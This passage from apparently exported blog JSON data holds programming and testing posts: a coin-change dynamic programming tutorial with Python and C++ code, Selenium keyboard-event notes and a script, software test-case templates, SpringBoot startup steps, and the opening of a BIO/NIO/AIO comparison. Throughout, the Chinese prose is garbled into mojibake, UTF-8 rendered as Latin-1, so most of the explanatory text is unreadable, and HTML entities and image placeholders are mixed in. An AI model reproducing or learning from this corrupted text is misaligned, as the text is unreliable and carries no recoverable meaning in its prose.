å‡½æ•°ï¼š dp(n) çš„å®šä¹‰ï¼šè¾“å…¥ä¸€ä¸ªç›®æ ‡é‡‘é¢ nï¼Œè¿”å›å‡‘å‡ºç›®æ ‡é‡‘é¢ n çš„æœ€å°‘ç¡¬å¸æ•°é‡ã€‚ ææ¸…æ¥šä¸Šé¢è¿™å‡ ä¸ªå…³é”®ç‚¹ï¼Œè§£æ³•çš„ä¼ªç å°±å¯ä»¥å†™å‡ºæ¥äº†ï¼š # ä¼ªç æ¡†æ¶ def coinChange(coins: List[int], amount: int): # å®šä¹‰ï¼šè¦å‡‘å‡ºé‡‘é¢ nï¼Œè‡³å°‘è¦ dp(n) ä¸ªç¡¬å¸ def dp(n): # åšé€‰æ‹©ï¼Œé€‰æ‹©éœ€è¦ç¡¬å¸æœ€å°‘çš„é‚£ä¸ªç»“æœ for coin in coins: res = min(res, 1 + dp(n - coin)) return res # é¢˜ç›®è¦æ±‚çš„æœ€ç»ˆç»“æœæ˜¯ dp(amount) return dp(amount) æ ¹æ®ä¼ªç ï¼Œæˆ‘ä»¬åŠ ä¸Š base case å³å¯å¾—åˆ°æœ€ç»ˆçš„ç­”æ¡ˆã€‚æ˜¾ç„¶ç›®æ ‡é‡‘é¢ä¸º 0 æ—¶ï¼Œæ‰€éœ€ç¡¬å¸æ•°é‡ä¸º 0ï¼›å½“ç›®æ ‡é‡‘é¢å°äº 0 æ—¶ï¼Œæ— è§£ï¼Œè¿”å› -1ï¼š def coinChange(coins: List[int], amount: int): def dp(n): # base case if n == 0: return 0 if n &lt; 0: return -1 # æ±‚æœ€å°å€¼ï¼Œæ‰€ä»¥åˆå§‹åŒ–ä¸ºæ­£æ— ç©· res = float(&#39;INF&#39;) for coin in coins: subproblem = dp(n - coin) # å­é—®é¢˜æ— è§£ï¼Œè·³è¿‡ if subproblem == -1: continue res = min(res, 1 + subproblem) return res if res != float(&#39;INF&#39;) else -1 return dp(amount) è‡³æ­¤ï¼ŒçŠ¶æ€è½¬ç§»æ–¹ç¨‹å…¶å®å·²ç»å®Œæˆäº†ï¼Œä»¥ä¸Šç®—æ³•å·²ç»æ˜¯æš´åŠ›è§£æ³•äº†ï¼Œä»¥ä¸Šä»£ç çš„æ•°å­¦å½¢å¼å°±æ˜¯çŠ¶æ€è½¬ç§»æ–¹ç¨‹ï¼š img è‡³æ­¤ï¼Œè¿™ä¸ªé—®é¢˜å…¶å®å°±è§£å†³äº†ï¼Œåªä¸è¿‡éœ€è¦æ¶ˆé™¤ä¸€ä¸‹é‡å å­é—®é¢˜ï¼Œæ¯”å¦‚ amount = 11, coins = {1,2,5} æ—¶ç”»å‡ºé€’å½’æ ‘çœ‹çœ‹ï¼š img é€’å½’ç®—æ³•çš„æ—¶é—´å¤æ‚åº¦åˆ†æï¼šå­é—®é¢˜æ€»æ•° x æ¯ä¸ªå­é—®é¢˜çš„æ—¶é—´ã€‚ å­é—®é¢˜æ€»æ•°ä¸ºé€’å½’æ ‘èŠ‚ç‚¹ä¸ªæ•°ï¼Œè¿™ä¸ªæ¯”è¾ƒéš¾çœ‹å‡ºæ¥ï¼Œæ˜¯ O(n^k)ï¼Œæ€»ä¹‹æ˜¯æŒ‡æ•°çº§åˆ«çš„ã€‚æ¯ä¸ªå­é—®é¢˜ä¸­å«æœ‰ä¸€ä¸ª for å¾ªç¯ï¼Œå¤æ‚åº¦ä¸º O(k)ã€‚æ‰€ä»¥æ€»æ—¶é—´å¤æ‚åº¦ä¸º O(k * n^k)ï¼ŒæŒ‡æ•°çº§åˆ«ã€‚ 2ã€å¸¦å¤‡å¿˜å½•çš„é€’å½’ ç±»ä¼¼ä¹‹å‰æ–æ³¢é‚£å¥‘æ•°åˆ—çš„ä¾‹å­ï¼Œåªéœ€è¦ç¨åŠ ä¿®æ”¹ï¼Œå°±å¯ä»¥é€šè¿‡å¤‡å¿˜å½•æ¶ˆé™¤å­é—®é¢˜ï¼š def coinChange(coins: List[int], amount: int): # å¤‡å¿˜å½• memo = dict() def dp(n): # æŸ¥å¤‡å¿˜å½•ï¼Œé¿å…é‡å¤è®¡ç®— if n in memo: return memo[n] # base case if n == 0: return 0 if n &lt; 0: return -1 res = float(&#39;INF&#39;) for coin in coins: subproblem = dp(n - coin) if subproblem == -1: continue res = min(res, 1 + subproblem) # è®°å…¥å¤‡å¿˜å½• memo[n] = res if res != float(&#39;INF&#39;) else -1 return memo[n] return dp(amount) ä¸ç”»å›¾äº†ï¼Œå¾ˆæ˜¾ç„¶ã€Œå¤‡å¿˜å½•ã€å¤§å¤§å‡å°äº†å­é—®é¢˜æ•°ç›®ï¼Œå®Œå…¨æ¶ˆé™¤äº†å­é—®é¢˜çš„å†—ä½™ï¼Œæ‰€ä»¥å­é—®é¢˜æ€»æ•°ä¸ä¼šè¶…è¿‡é‡‘é¢æ•° nï¼Œå³å­é—®é¢˜æ•°ç›®ä¸º O(n)ã€‚å¤„ç†ä¸€ä¸ªå­é—®é¢˜çš„æ—¶é—´ä¸å˜ï¼Œä»æ˜¯ O(k)ï¼Œæ‰€ä»¥æ€»çš„æ—¶é—´å¤æ‚åº¦æ˜¯ O(kn)ã€‚ 3ã€dp æ•°ç»„çš„è¿­ä»£è§£æ³• å½“ç„¶ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥è‡ªåº•å‘ä¸Šä½¿ç”¨ dp table æ¥æ¶ˆé™¤é‡å å­é—®é¢˜ï¼Œå…³äºã€ŒçŠ¶æ€ã€ã€Œé€‰æ‹©ã€å’Œ base case ä¸ä¹‹å‰æ²¡æœ‰åŒºåˆ«ï¼Œdp æ•°ç»„çš„å®šä¹‰å’Œåˆšæ‰ dp å‡½æ•°ç±»ä¼¼ï¼Œä¹Ÿæ˜¯æŠŠã€ŒçŠ¶æ€ã€ï¼Œä¹Ÿå°±æ˜¯ç›®æ ‡é‡‘é¢ä½œä¸ºå˜é‡ã€‚ä¸è¿‡ dp å‡½æ•°ä½“ç°åœ¨å‡½æ•°å‚æ•°ï¼Œè€Œ dp æ•°ç»„ä½“ç°åœ¨æ•°ç»„ç´¢å¼•ï¼š dp æ•°ç»„çš„å®šä¹‰ï¼šå½“ç›®æ ‡é‡‘é¢ä¸º i æ—¶ï¼Œè‡³å°‘éœ€è¦ dp[i] æšç¡¬å¸å‡‘å‡ºã€‚ æ ¹æ®æˆ‘ä»¬æ–‡ç« å¼€å¤´ç»™å‡ºçš„åŠ¨æ€è§„åˆ’ä»£ç æ¡†æ¶å¯ä»¥å†™å‡ºå¦‚ä¸‹è§£æ³•ï¼š int coinChange(vector&lt;int&gt;&amp; coins, int amount) { // æ•°ç»„å¤§å°ä¸º amount + 1ï¼Œåˆå§‹å€¼ä¹Ÿä¸º amount + 1 vector&lt;int&gt; dp(amount + 1, amount + 1); // base case dp[0] = 0; // å¤–å±‚ for å¾ªç¯åœ¨éå†æ‰€æœ‰çŠ¶æ€çš„æ‰€æœ‰å–å€¼ for (int i = 0; i &lt; dp.size(); i++) { // å†…å±‚ for å¾ªç¯åœ¨æ±‚æ‰€æœ‰é€‰æ‹©çš„æœ€å°å€¼ for (int coin : coins) { // å­é—®é¢˜æ— è§£ï¼Œè·³è¿‡ if (i - coin &lt; 0) continue; dp[i] = min(dp[i], 1 + dp[i - coin]); } } return (dp[amount] == amount + 1) ? -1 : dp[amount]; } img PSï¼šä¸ºå•¥ dp æ•°ç»„åˆå§‹åŒ–ä¸º amount + 1 å‘¢ï¼Œå› ä¸ºå‡‘æˆ amount é‡‘é¢çš„ç¡¬å¸æ•°æœ€å¤šåªå¯èƒ½ç­‰äº amountï¼ˆå…¨ç”¨ 1 å…ƒé¢å€¼çš„ç¡¬å¸ï¼‰ï¼Œæ‰€ä»¥åˆå§‹åŒ–ä¸º amount + 1 å°±ç›¸å½“äºåˆå§‹åŒ–ä¸ºæ­£æ— ç©·ï¼Œä¾¿äºåç»­å–æœ€å°å€¼ã€‚ ä¸‰ã€æœ€åæ€»ç»“ç¬¬ä¸€ä¸ªæ–æ³¢é‚£å¥‘æ•°åˆ—çš„é—®é¢˜ï¼Œè§£é‡Šäº†å¦‚ä½•é€šè¿‡ã€Œå¤‡å¿˜å½•ã€æˆ–è€…ã€Œdp tableã€çš„æ–¹æ³•æ¥ä¼˜åŒ–é€’å½’æ ‘ï¼Œå¹¶ä¸”æ˜ç¡®äº†è¿™ä¸¤ç§æ–¹æ³•æœ¬è´¨ä¸Šæ˜¯ä¸€æ ·çš„ï¼Œåªæ˜¯è‡ªé¡¶å‘ä¸‹å’Œè‡ªåº•å‘ä¸Šçš„ä¸åŒè€Œå·²ã€‚ ç¬¬äºŒä¸ªå‡‘é›¶é’±çš„é—®é¢˜ï¼Œå±•ç¤ºäº†å¦‚ä½•æµç¨‹åŒ–ç¡®å®šã€ŒçŠ¶æ€è½¬ç§»æ–¹ç¨‹ã€ï¼Œåªè¦é€šè¿‡çŠ¶æ€è½¬ç§»æ–¹ç¨‹å†™å‡ºæš´åŠ›é€’å½’è§£ï¼Œå‰©ä¸‹çš„ä¹Ÿå°±æ˜¯ä¼˜åŒ–é€’å½’æ ‘ï¼Œæ¶ˆé™¤é‡å å­é—®é¢˜è€Œå·²ã€‚ å¦‚æœä½ ä¸å¤ªäº†è§£åŠ¨æ€è§„åˆ’ï¼Œè¿˜èƒ½çœ‹åˆ°è¿™é‡Œï¼ŒçœŸå¾—ç»™ä½ é¼“æŒï¼Œç›¸ä¿¡ä½ å·²ç»æŒæ¡äº†è¿™ä¸ªç®—æ³•çš„è®¾è®¡æŠ€å·§ã€‚ è®¡ç®—æœºè§£å†³é—®é¢˜å…¶å®æ²¡æœ‰ä»»ä½•å¥‡æŠ€æ·«å·§ï¼Œå®ƒå”¯ä¸€çš„è§£å†³åŠæ³•å°±æ˜¯ç©·ä¸¾ï¼Œç©·ä¸¾æ‰€æœ‰å¯èƒ½æ€§ã€‚ç®—æ³•è®¾è®¡æ— éå°±æ˜¯å…ˆæ€è€ƒâ€œå¦‚ä½•ç©·ä¸¾â€ï¼Œç„¶åå†è¿½æ±‚â€œå¦‚ä½•èªæ˜åœ°ç©·ä¸¾â€ã€‚ åˆ—å‡ºåŠ¨æ€è½¬ç§»æ–¹ç¨‹ï¼Œå°±æ˜¯åœ¨è§£å†³â€œå¦‚ä½•ç©·ä¸¾â€çš„é—®é¢˜ã€‚ä¹‹æ‰€ä»¥è¯´å®ƒéš¾ï¼Œä¸€æ˜¯å› ä¸ºå¾ˆå¤šç©·ä¸¾éœ€è¦é€’å½’å®ç°ï¼ŒäºŒæ˜¯å› ä¸ºæœ‰çš„é—®é¢˜æœ¬èº«çš„è§£ç©ºé—´å¤æ‚ï¼Œä¸é‚£ä¹ˆå®¹æ˜“ç©·ä¸¾å®Œæ•´ã€‚ å¤‡å¿˜å½•ã€DP table å°±æ˜¯åœ¨è¿½æ±‚â€œå¦‚ä½•èªæ˜åœ°ç©·ä¸¾â€ã€‚ç”¨ç©ºé—´æ¢æ—¶é—´çš„æ€è·¯ï¼Œæ˜¯é™ä½æ—¶é—´å¤æ‚åº¦çš„ä¸äºŒæ³•é—¨ï¼Œé™¤æ­¤ä¹‹å¤–ï¼Œè¯•é—®ï¼Œè¿˜èƒ½ç©å‡ºå•¥èŠ±æ´»ï¼Ÿ ä¹‹åæˆ‘ä»¬ä¼šæœ‰ä¸€ç« ä¸“é—¨è®²è§£åŠ¨æ€è§„åˆ’é—®é¢˜ï¼Œå¦‚æœæœ‰ä»»ä½•é—®é¢˜éƒ½å¯ä»¥éšæ—¶å›æ¥é‡è¯»æœ¬æ–‡ï¼Œå¸Œæœ›è¯»è€…åœ¨é˜…è¯»æ¯ä¸ªé¢˜ç›®å’Œè§£æ³•æ—¶ï¼Œå¤šå¾€ã€ŒçŠ¶æ€ã€å’Œã€Œé€‰æ‹©ã€ä¸Šé ï¼Œæ‰èƒ½å¯¹è¿™å¥—æ¡†æ¶äº§ç”Ÿè‡ªå·±çš„ç†è§£ï¼Œè¿ç”¨è‡ªå¦‚ã€‚","categories":[],"tags":[{"name":"algorithm","slug":"algorithm","permalink":"https://blog.kayleh.top/tags/algorithm/"}]},{"title":"automated testï¼šselenium","slug":"è‡ªåŠ¨åŒ–æµ‹è¯•","date":"2021-01-31T10:52:47.000Z","updated":"2021-04-11T17:11:29.007Z","comments":true,"path":"è‡ªåŠ¨åŒ–æµ‹è¯•/","link":"","permalink":"https://blog.kayleh.top/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/","excerpt":"","text":"Selenium æµè§ˆå™¨æ’ä»¶Selenium IDE 1612201844386 Selenium 3.0æ²¡æœ‰RC ä½¿ç”¨ï¼š Record a new test in a new project åœ¨æ–°é¡¹ç›®ä¸­å½•åˆ¶ä¸€ä¸ªæ–°æµ‹è¯• Open an existing project æ‰“å¼€ä¸€ä¸ªç°æœ‰é¡¹ç›® Create a new project åˆ›å»ºä¸€ä¸ªæ–°é¡¹ç›® Close Selenium IDE å…³é—­Selenium IDE è„šæœ¬å½•åˆ¶åœ¨æµè§ˆå™¨ä¸­æ‰‹åŠ¨æ“ä½œï¼Œå°±å¯ä»¥seleniumå½•åˆ¶å‡ºæ¥ 1612203333723 æ–­è¨€1612203983826 1612204051810 å¯¼å‡ºExport python pytest åœ¨pythonç¯å¢ƒä¸‹ä½¿ç”¨selenium1 1612205559810 2 æµè§ˆå™¨é©±åŠ¨webdriver http://chromedriver.storage.googleapis.com/index.html æ”¾åˆ°pythonç›®å½•ä¸‹ï¼ˆpythonå·²æ·»åŠ è¿›ç³»ç»Ÿå˜é‡ï¼‰ webdriver API1612545316429 é”®ç›˜äº‹ä»¶keyåŒ…æä¾›æŒ‰é”®æ–¹æ³•ä½¿ç”¨å¿…é¡»å…ˆå¼•ç”¨keyåŒ…ï¼šfrom selenium.webdriver.common.keys import Keys é”®ç›˜äº‹ä»¶ï¼Œåœ¨ç°å®æ“ä½œä¸­æˆ‘ä»¬ä¹ æƒ¯æ€§çš„æŒ‰tabè§åˆ‡æ¢åˆ°å†™ä¸€ä¸ªè¾“å…¥æˆ–è€…å…ƒç´ ï¼ŒKey()ç±»å‡ ä¹æä¾›æ‰€æœ‰æŒ‰é”®çš„æ–¹æ³•ï¼š å¼•ç”¨æ–¹æ³• å¯¹åº”é”®ç›˜ send_keys(Keys.BACK_SPACE) åˆ é™¤é”®ï¼ˆBackSpaceï¼‰ send_keys(Keys.SPACE) ç©ºæ ¼é”®(Space) send_keys(Keys.TAB) åˆ¶è¡¨é”®(Tab) send_keys(Keys.ESCAPE) å›é€€é”®ï¼ˆEscï¼‰ send_keys(Keys.ENTER) å›è½¦é”®ï¼ˆEnterï¼‰ send_keys(Keys.CONTROL,â€™aâ€™) å…¨é€‰ï¼ˆCtrl+Aï¼‰ send_keys(Keys.CONTROL,â€™câ€™) å¤åˆ¶ï¼ˆCtrl+Cï¼‰ send_keys(Keys.CONTROL,â€™xâ€™) å‰ªåˆ‡ï¼ˆCtrl+Xï¼‰ send_keys(Keys.CONTROL,â€™vâ€™) ç²˜è´´ï¼ˆCtrl+Vï¼‰ send_keys(Keys.F1) é”®ç›˜ F1 send_keys(Keys.F12) é”®ç›˜ F12 #coding=utf-8 from selenium import webdriver from selenium.webdriver.common.keys import Keys import time driver = webdriver.Chrome() driver.get(&quot;https://www.baidu.com&quot;) driver.find_element_by_id(&quot;kw&quot;).send_keys(&quot;seleniumm&quot;) time.sleep(1) driver.find_element_by_id(&quot;kw&quot;).send_keys(Keys.BACK_SPACE) time.sleep(1) # å’Œå‰é¢çš„æ‹¼æ¥ driver.find_element_by_id(&quot;kw&quot;).send_keys(&quot;seleniumm&quot;) time.sleep(1) # ctrl+a driver.find_element_by_id(&quot;kw&quot;).send_keys(Keys.CONTROL,&quot;a&quot;) time.sleep(1) driver.find_element_by_id(&quot;kw&quot;).send_keys(Keys.CONTROL,&quot;x&quot;) time.sleep(1) driver.find_element_by_id(&quot;kw&quot;).send_keys(Keys.CONTROL,&quot;v&quot;) time.sleep(1) driver.find_element_by_id(&quot;su&quot;).click() driver.quit() æ“ä½œalter1612290819266 è®°å¾—åŠ å»¶æ—¶,æŠŠæ ·å¼æ˜¾ç¤ºå‡ºæ¥ ç‰ˆæœ¬é—®é¢˜,switch_to.alert å¤šè¡¨å•å¤„ç† 1612372992770 1612373570630 å…ƒç´ ç­‰å¾… 1612375105716 å¯ä»¥è®¾ç½®æŠ›å‡ºçš„ä¿¡æ¯ï¼š åˆ¤æ–­ï¼š 1612376670647 æ³¨æ„ï¼š 1612376761036 ç³»ç»Ÿç­‰å¾…time.sleep(5) è‡ªåŠ¨åŒ–æµ‹è¯•ç”¨ä¾‹è®¾è®¡1612546256022 1612455083120 1612458657522 1612458617545 1612458302921 è‡ªåŠ¨åŒ–æµ‹è¯•æ¨¡å‹1612540746961 çº¿æ€§æµ‹è¯•1613234642404 æ¨¡å—åŒ–é©±åŠ¨æµ‹è¯•class very_login(): 1612547219237 æ‚¬æµ® 1612547421180 æ•°æ®é©±åŠ¨æµ‹è¯•1612628515235 å­—å…¸ csvæ–‡ä»¶ï¼ˆexcelæ–‡ä»¶ï¼‰ æ•°æ®åº“ é…ç½®æ–‡ä»¶ æ•°æ®çš„å‚æ•°åŒ– 1612628547080 :one:å­—å…¸ï¼š1612633589340 :two:csvæ–‡ä»¶1612635083102 1612635099344 import csv 1612635490538 for d in data: print(d) æ·»åŠ xlrdæ¨¡å—ï¼ˆexcelæ–‡ä»¶ï¼‰1612637116599","categories":[],"tags":[{"name":"test","slug":"test","permalink":"https://blog.kayleh.top/tags/test/"}]},{"title":"Test case","slug":"æµ‹è¯•ç”¨ä¾‹","date":"2021-01-24T09:51:10.000Z","updated":"2021-04-11T17:11:28.969Z","comments":true,"path":"æµ‹è¯•ç”¨ä¾‹/","link":"","permalink":"https://blog.kayleh.top/%E6%B5%8B%E8%AF%95%E7%94%A8%E4%BE%8B/","excerpt":"","text":"æµ‹è¯•ç”¨ä¾‹ä»€ä¹ˆæ˜¯æµ‹è¯•ç”¨ä¾‹ æµ‹è¯•ç”¨ä¾‹(Test Case)æ˜¯æŒ‡å¯¹ä¸€é¡¹ç‰¹å®šçš„è½¯ä»¶äº§å“è¿›è¡Œæµ‹è¯•ä»»åŠ¡çš„æè¿°ï¼Œä½“ç°æµ‹è¯•æ–¹æ¡ˆã€æ–¹æ³•ã€æŠ€æœ¯å’Œç­–ç•¥ã€‚å…¶å†…å®¹åŒ…æ‹¬æµ‹è¯•ç›®æ ‡ã€æµ‹è¯•ç¯å¢ƒã€è¾“å…¥æ•°æ®ã€æµ‹è¯•æ­¥éª¤ã€é¢„æœŸç»“æœã€æµ‹è¯•è„šæœ¬ç­‰ï¼Œæœ€ç»ˆå½¢æˆæ–‡æ¡£ã€‚ç®€å•åœ°è®¤ä¸ºï¼Œæµ‹è¯•ç”¨ä¾‹æ˜¯ä¸ºæŸä¸ªç‰¹æ®Šç›®æ ‡è€Œç¼–åˆ¶çš„ä¸€ç»„æµ‹è¯•è¾“å…¥ã€æ‰§è¡Œæ¡ä»¶ä»¥åŠé¢„æœŸç»“æœï¼Œç”¨äºæ ¸å®æ˜¯å¦æ»¡è¶³æŸä¸ªç‰¹å®šè½¯ä»¶éœ€æ±‚ã€‚ å›å½’æµ‹è¯•æ¨¡æ¿ï¼šï¼ˆexcelï¼‰ æµ‹è¯•ç”¨ä¾‹ç¼–å· æµ‹è¯•é¡¹ ä¾èµ–ç”¨ä¾‹ æµ‹è¯•æ­¥éª¤ è¾“å…¥æ•°æ® é¢„æœŸç»“æœ æµ‹è¯•ç»“æœ æµ‹è¯•äºº å¤‡æ³¨ 1ã€2ã€ æ ‡è¯†ç¬¦(ç”¨ä¾‹ç¼–å·)ï¼Œä¸€èˆ¬ç¼–å·è§„åˆ™ï¼šTestCase_é¡¹ç›®åç§°_æ¨¡å—åç§°_åŠŸèƒ½åç§°_0001 æµ‹è¯•ç”¨ä¾‹çš„æµ‹è¯•ç›®çš„ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œç”¨ä¸€å¥è¯è¡¨æ˜ç›®çš„ã€‚ï¼ˆç”¨è°·æ­Œæµè§ˆå™¨æ‰“å¼€ç™¾åº¦é¦–é¡µï¼‰ ä¸€èˆ¬åŠŸèƒ½æµç¨‹ä¸Šï¼Œä¸‹æ¸¸çš„åŠŸèƒ½æµ‹è¯•ä¾èµ–äºä¸Šæ¸¸çš„åŠŸèƒ½æµ‹è¯•çš„ç”¨ä¾‹ ç”¨æœ€æœ´å®çš„è¯­è¨€ï¼Œå†™å‡ºæ¥è½¯ä»¶çš„æ“ä½œæ­¥éª¤ï¼Œè¦å°½é‡è¯¦ç»†ï¼ˆåœ¨æ–‡æœ¬æ¡†è¾“å…¥xxxï¼‰ æµ‹è¯•æ•°æ® å‡†ç¡®ï¼Œåœ¨é‡è¦çš„æ­¥éª¤ä¹‹åï¼Œè®¾å®šé¢„æœŸç»“æœï¼Œä¸€èˆ¬å’Œæµ‹è¯•ç›®çš„å¯†åˆ‡ç›¸å…³ åªæœ‰ä¸¤ä¸ªï¼Œé€šè¿‡/å¤±è´¥ï¼ˆå’Œé¢„æœŸç»“æœï¼‰ æµ‹è¯•ç”¨ä¾‹ç¼–å†™æ³¨æ„äº‹é¡¹é»‘ç›’æµ‹è¯•ç”¨ä¾‹è®¾è®¡æ–¹æ³•","categories":[],"tags":[{"name":"test","slug":"test","permalink":"https://blog.kayleh.top/tags/test/"}]},{"title":"Software testing process","slug":"è½¯ä»¶æµ‹è¯•æµç¨‹","date":"2021-01-15T09:17:42.000Z","updated":"2021-04-11T17:11:29.051Z","comments":true,"path":"è½¯ä»¶æµ‹è¯•æµç¨‹/","link":"","permalink":"https://blog.kayleh.top/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B/","excerpt":"","text":"è½¯ä»¶æµ‹è¯•æµç¨‹1610797689455 è¿‡ç¨‹æ¨¡å‹â˜…Væ¨¡å‹1610798317382 â˜…Wæ¨¡å‹1610799034052 Hæ¨¡å‹1610800924088 Xæ¨¡å‹1610801339901 æµ‹è¯•è¿‡ç¨‹ç†å¿µ1610802495380 è½¯ä»¶æµ‹è¯•çš„åˆ†ç±»1610811373564 1610811498245 æµ‹è¯•éœ€æ±‚åˆ†æ1.åˆ—å‡ºå¾…æµ‹éœ€æ±‚ 2.è®¾å®šéœ€æ±‚ä¼˜å…ˆçº§ 3.è¯¦ç»†æè¿°æµ‹è¯•éœ€æ±‚å†…å®¹ 4.ç»è¿‡è¯„å®¡å¹¶é€šè¿‡ 5.éœ€æ±‚ç»Ÿè®¡åŠåˆ†æ æµ‹è¯•éœ€æ±‚ç¼–å· æµ‹è¯•éœ€æ±‚åç§° è´¨é‡ç‰¹æ€§ æ‰€åœ¨æ¨¡å— æ‰€åœ¨é¡µé¢ ä¼˜å…ˆçº§ è´Ÿè´£äºº ç‰ˆæœ¬å· éœ€æ±‚è¯¦æƒ…æè¿° JXC-SRS-GN-XT-JBXX-001 å…¬å¸åç§° åŠŸèƒ½ç‰¹æ€§ ç³»ç»Ÿè®¾ç½®æ¨¡å— åŸºæœ¬ä¿¡æ¯è®¾ç½®æ¨¡å— ä½çº§ å¼ ä¸‰ v2.1 1.å†…å®¹:æ–‡æœ¬ 2.çº¦æŸ:éç©º æµ‹è¯•ç”¨ä¾‹1611773740638 1611817748756 1611818572479 ç¼ºé™·æŠ¥å‘Š ç¼ºé™·ç¼–å· ç¼ºé™·æ ‡é¢˜ çŠ¶æ€(newæ–°æäº¤,openç¡®è®¤ä¿®æ”¹,fixedä¿®æ”¹å®Œæˆ,closedå›å½’é€šè¿‡,reopenå›å½’ä¸é€šè¿‡) ä¼˜å…ˆçº§(é«˜,ä¸­,ä½) ä¸¥é‡ç¨‹åº¦(è‡´å‘½,ä¸¥é‡,ä¸€èˆ¬,è½»å¾®,å»ºè®®) æäº¤äºº ç¼ºé™·æè¿° 1 1611818765336 QCéœ€æ±‚ 1611858108421 1611858126637 text plan 1611858334019 æ­¥éª¤: 1611858411788 test lab 1611858561200 1611858628802 æœ‰ç¼ºé™·æ—¶,ç«‹å³æäº¤ç¼ºé™· 1611858681020 1611858797611 è‡ªå®šä¹‰1611858911944 å…¥åº“æ•°é‡ç”¨ä¾‹åˆ†æ1611861921070 1611862130739 ç»„åˆæµ‹è¯•åˆ¤å®šè¡¨ 1612106566517 åˆ é™¤æµ‹è¯•1612107740235 å®‰å…¨æµ‹è¯•XSSã€SQLæ³¨å…¥","categories":[],"tags":[{"name":"test","slug":"test","permalink":"https://blog.kayleh.top/tags/test/"}]},{"title":"SpringBoot startup process","slug":"SpringBootå¯åŠ¨è¿‡ç¨‹å’Œæ³¨è§£","date":"2021-01-15T04:40:54.000Z","updated":"2021-04-11T17:11:28.432Z","comments":true,"path":"SpringBootå¯åŠ¨è¿‡ç¨‹å’Œæ³¨è§£/","link":"","permalink":"https://blog.kayleh.top/SpringBoot%E5%90%AF%E5%8A%A8%E8%BF%87%E7%A8%8B%E5%92%8C%E6%B3%A8%E8%A7%A3/","excerpt":"","text":"SpringBootåº”ç”¨å¯åŠ¨æµç¨‹ æˆ‘ä»¬å°†å„æ­¥éª¤æ€»ç»“ç²¾ç‚¼å¦‚ä¸‹ï¼š é€šè¿‡ SpringFactoriesLoader åŠ è½½ META-INF/spring.factories æ–‡ä»¶ï¼Œè·å–å¹¶åˆ›å»º SpringApplicationRunListener å¯¹è±¡ ç„¶åç”± SpringApplicationRunListener æ¥å‘å‡º starting æ¶ˆæ¯ åˆ›å»ºå‚æ•°ï¼Œå¹¶é…ç½®å½“å‰ SpringBoot åº”ç”¨å°†è¦ä½¿ç”¨çš„ Environment å®Œæˆä¹‹åï¼Œä¾ç„¶ç”± SpringApplicationRunListener æ¥å‘å‡º environmentPrepared æ¶ˆæ¯ åˆ›å»º ApplicationContext åˆå§‹åŒ– ApplicationContextï¼Œå¹¶è®¾ç½® Environmentï¼ŒåŠ è½½ç›¸å…³é…ç½®ç­‰ ç”± SpringApplicationRunListener æ¥å‘å‡º contextPrepared æ¶ˆæ¯ï¼Œå‘ŠçŸ¥SpringBoot åº”ç”¨ä½¿ç”¨çš„ ApplicationContext å·²å‡†å¤‡OK å°†å„ç§ beans è£…è½½å…¥ ApplicationContextï¼Œç»§ç»­ç”± SpringApplicationRunListener æ¥å‘å‡º contextLoaded æ¶ˆæ¯ï¼Œå‘ŠçŸ¥ SpringBoot åº”ç”¨ä½¿ç”¨çš„ ApplicationContext å·²è£…å¡«OK refresh ApplicationContextï¼Œå®ŒæˆIoCå®¹å™¨å¯ç”¨çš„æœ€åä¸€æ­¥ ç”± SpringApplicationRunListener æ¥å‘å‡º started æ¶ˆæ¯ å®Œæˆæœ€ç»ˆçš„ç¨‹åºçš„å¯åŠ¨ ç”± SpringApplicationRunListener æ¥å‘å‡º running æ¶ˆæ¯ï¼Œå‘ŠçŸ¥ç¨‹åºå·²è¿è¡Œèµ·æ¥äº† è‡³æ­¤ï¼Œå…¨æµç¨‹ç»“æŸï¼","categories":[],"tags":[{"name":"frame","slug":"frame","permalink":"https://blog.kayleh.top/tags/frame/"}]},{"title":"the difference of BIOã€NIOã€AIO","slug":"BIOã€NIOã€AIOåŒºåˆ«","date":"2020-12-20T08:15:14.000Z","updated":"2021-04-11T17:11:28.097Z","comments":true,"path":"BIOã€NIOã€AIOåŒºåˆ«/","link":"","permalink":"https://blog.kayleh.top/BIO%E3%80%81NIO%E3%80%81AIO%E5%8C%BA%E5%88%AB/","excerpt":"","text":"BIOã€NIOã€AIOåŒºåˆ«ä¸€ã€BIO åœ¨JDK1.4å‡ºæ¥ä¹‹å‰ï¼Œæˆ‘ä»¬å»ºç«‹ç½‘ç»œè¿æ¥çš„æ—¶å€™é‡‡ç”¨BIOæ¨¡å¼ï¼Œéœ€è¦å…ˆåœ¨æœåŠ¡ç«¯å¯åŠ¨ä¸€ä¸ªServerSocketï¼Œç„¶ååœ¨å®¢æˆ·ç«¯å¯åŠ¨Socketæ¥å¯¹æœåŠ¡ç«¯è¿›è¡Œé€šä¿¡ï¼Œé»˜è®¤æƒ…å†µä¸‹æœåŠ¡ç«¯éœ€è¦å¯¹æ¯ä¸ªè¯·æ±‚å»ºç«‹ä¸€å †çº¿ç¨‹ç­‰å¾…è¯·æ±‚ï¼Œè€Œå®¢æˆ·ç«¯å‘é€è¯·æ±‚åï¼Œå…ˆå’¨è¯¢æœåŠ¡ç«¯æ˜¯å¦æœ‰çº¿ç¨‹ç›¸åº”ï¼Œå¦‚æœæ²¡æœ‰åˆ™ä¼šä¸€ç›´ç­‰å¾…æˆ–è€…é­åˆ°æ‹’ç»è¯·æ±‚ï¼Œå¦‚æœæœ‰çš„è¯ï¼Œå®¢æˆ·ç«¯ä¼šçº¿ç¨‹ä¼šç­‰å¾…è¯·æ±‚ç»“æŸåæ‰ç»§ç»­æ‰§è¡Œã€‚ äºŒã€NIO NIOæœ¬èº«æ˜¯åŸºäºäº‹ä»¶é©±åŠ¨æ€æƒ³æ¥å®Œæˆçš„ï¼Œå…¶ä¸»è¦æƒ³è§£å†³çš„æ˜¯BIOçš„å¤§å¹¶å‘é—®é¢˜ï¼š 